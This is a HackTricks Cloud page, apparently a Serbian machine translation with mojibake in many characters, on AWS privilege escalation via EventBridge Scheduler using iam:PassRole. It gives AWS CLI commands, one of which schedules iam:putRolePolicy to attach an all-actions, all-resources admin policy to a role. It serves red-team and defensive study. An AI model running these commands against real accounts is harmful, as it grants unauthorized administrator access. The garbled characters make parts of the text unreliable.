# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler se mo쬰 koristiti za eskalaciju privilegija zakazivanjem poziva raznim AWS uslugama. Iskori코캖avanjem svoje sposobnosti da poziva usluge na zakazanoj osnovi, korisnici sa dovoljnim dozvolama mogu eskalirati privilegije. Evo nekih od klju캜nih akcija koje EventBridge Scheduler mo쬰 pokrenuti koriste캖i 코ablonske ciljeve:

* Lambda: lambda:InvokeFunction - Pozvati Lambda funkcije prema rasporedu.
* CodeBuild: codebuild:StartBuild - Pokrenuti AWS CodeBuild projekte.
* CodePipeline: codepipeline:StartPipelineExecution - Pokrenuti AWS CodePipeline izvr코enja.
* ECS: ecs:RunTask - Pokrenuti ECS zadatke.
* EventBridge: events:PutEvents - Postaviti doga캠aje u EventBridge.
* Inspector: inspector:StartAssessmentRun - Pokrenuti Amazon Inspector procene.
* Kinesis: kinesis:PutRecord - Postaviti zapise u Kinesis tokove.
* Firehose: firehose:PutRecord - Postaviti zapise u Firehose tokove isporuke.
* SageMaker: sagemaker:StartPipelineExecution - Pokrenuti SageMaker izvr코enja.
* SNS: sns:Publish - Objaviti poruke na SNS temama.
* SQS: sqs:SendMessage - Slati poruke u SQS redove.
* Step Functions: states:StartExecution - Pokrenuti izvr코enja AWS Step Functions.

Ovo su samo neke od 코ablonskih akcija koje EventBridge Scheduler mo쬰 izvesti. Me캠utim, kori코캖enjem univerzalnih ciljeva, mo쬰 se pozvati mnogo drugih akcija 코irom AWS usluga. Univerzalni ciljevi omogu캖avaju 코ire API operacije izvan 코ablonske liste.

Vi코e informacija o EventBridge Scheduler-u u:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Korisnici sa `sts:AssumeRole`, `iam:PassRole`, i `scheduler:CreateSchedule or scheduler:UpdateSchedule` dozvolama mogu eskalirati privilegije koriste캖i EventBridge Scheduler za pozivanje usluga koriste캖i ulogu sa vi코im privilegijama.

Sa ovim dozvolama, napada캜 mo쬰 preuzeti ulogu sa povi코enim privilegijama i proslediti tu ulogu EventBridge Scheduler-u prilikom kreiranja ili a쬿riranja rasporeda. Raspored se mo쬰 konfigurisati da izvr코i bilo koju od prethodno navedenih akcija, kao 코to su pozivanje Lambda funkcija, pokretanje ECS zadataka, pokretanje CodePipeline izvr코enja, ili bilo koja operacija od 270 AWS usluga koje podr쬬va EventBridge Scheduler. Zakazivanjem ovih akcija, napada캜 bi mogao zloupotrebiti vi코e privilegije za izvo캠enje neovla코캖enih operacija 코irom AWS usluga. \\

Na primer, mogli bi konfigurisati raspored da pozove Lambda funkciju koja je 코ablonska akcija:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Pored akcija usluga zasnovanih na 코ablonima, mo쬰te koristiti univerzalne ciljeve u EventBridge Scheduler-u da pozovete 코irok spektar API operacija za mnoge AWS usluge. Univerzalni ciljevi nude fleksibilnost da pozovete gotovo bilo koji API. Jedan primer mo쬰 biti kori코캖enje univerzalnih ciljeva dodavanjem "AdminAccessPolicy", koriste캖i ulogu koja ima "putRolePolicy" politiku:
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## References

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
